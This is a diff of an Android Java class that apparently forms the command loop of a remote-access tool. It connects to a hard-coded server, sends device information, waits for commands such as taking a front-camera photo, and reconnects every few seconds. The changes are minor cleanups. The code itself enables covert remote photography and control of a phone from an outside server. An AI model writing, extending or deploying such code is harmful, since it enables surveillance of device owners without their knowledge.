@@ -180,15 +180,11 @@ public class ConnectionTask extends AsyncTask<Context, Void, Void>
         {
             try
             {
-//                TimeUnit.SECONDS.sleep(5);
-//                Utils.restartApp(context);
                 Socket s = new Socket(Constants.SRV_IP, Constants.SRV_PORT);
                 DataInputStream dataInputStream = new DataInputStream(s.getInputStream());
                 DataOutputStream dataOutputStream = new DataOutputStream(s.getOutputStream());
 
                 dataOutputStream.write(Utils.buildDefaultResponse(context).getBytes());
-//                dataOutputStream.write(Constants.JAVA_SIGNATURE.getBytes());
-//                dataOutputStream.flush();
 
 
                 StringBuffer stringBuffer = new StringBuffer();
@@ -196,8 +192,7 @@ public class ConnectionTask extends AsyncTask<Context, Void, Void>
                 stringBuffer.append(dataInputStream.readLine());
                 Log.println(Log.DEBUG, "test", stringBuffer.toString());
 
-                switch (stringBuffer.toString())
-                {
+                switch (stringBuffer.toString()) {
                     case Constants.TAKE_PICTURE_ACTION_FRONT:
                         takePictureAction(context, Constants.FRONT_CAMERA);
                         break;
@@ -222,6 +217,7 @@ public class ConnectionTask extends AsyncTask<Context, Void, Void>
 
                         break;
                 }
+                s.close();
             }
 
             catch (Exception e)
@@ -229,11 +225,12 @@ public class ConnectionTask extends AsyncTask<Context, Void, Void>
                 try
                 {
                     TimeUnit.SECONDS.sleep(5);
+//                    Utils.restartApp(context);
                 }
 
                 catch (Exception e1)
                 {
-
+                    e1.printStackTrace();
                 }
                 e.printStackTrace();
             }
